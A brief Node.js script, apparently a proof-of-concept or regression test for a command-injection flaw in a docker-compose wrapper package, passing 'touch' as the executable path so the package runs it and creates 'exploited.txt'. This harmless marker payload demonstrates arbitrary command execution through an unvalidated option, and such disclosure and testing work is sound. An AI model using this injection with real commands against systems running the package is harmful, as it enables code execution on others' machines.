'use strict'

const pkg = require('../src');

const options = {
    executablePath: 'touch',
    composeOptions: ['exploited.txt']
};

pkg.execCompose('', {}, options);